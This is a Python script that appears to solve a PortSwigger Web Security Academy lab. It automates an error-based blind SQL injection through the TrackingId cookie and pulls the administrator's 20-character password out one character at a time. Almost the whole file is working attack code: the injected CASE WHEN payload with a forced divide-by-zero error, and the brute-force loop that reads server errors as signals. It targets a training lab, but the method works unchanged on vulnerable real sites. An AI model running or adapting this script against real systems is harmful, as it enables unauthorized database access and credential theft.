import requests

# URL and headers
url = 'https://0ae900d80444715b80c8b73000e000d4.web-security-academy.net/filter?category=Gifts'
headers = {
    'Host': '0ae900d80444715b80c8b73000e000d4.web-security-academy.net',
    'Cookie': ''
}

# Characters to test
characters = 'abcdefghijklmnopqrstuvwxyz0123456789'

# Length of the password
password_length = 20

# TrackingId part that stays static in the cookie
base_cookie = "TrackingId=vGHNvbGXOxtH6KhY'||(SELECT CASE WHEN SUBSTR(password,{pos},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=vrWQyzb5IvwiMvvqdhyxzmtpuC5VkpMP"

# Function to perform the request and check for "Internal Server Error"
def is_correct_char(position, character):
    # Construct the SQL injection payload
    cookie_value = base_cookie.format(pos=position, char=character)
    headers['Cookie'] = cookie_value

    # Send the request
    response = requests.get(url, headers=headers)

    # Check if the response contains "Internal Server Error"
    return 'Internal Server Error' in response.text

# Initialize password as a list
password = [''] * password_length

# Iterate over each position in the password
for position in range(1, password_length + 1):
    for char in characters:
        if is_correct_char(position, char):
            password[position - 1] = char
            print(f"Found character {char} at position {position}")
            break

# Join the characters to form the password
password = ''.join(password)
print(f"Password found: {password}")
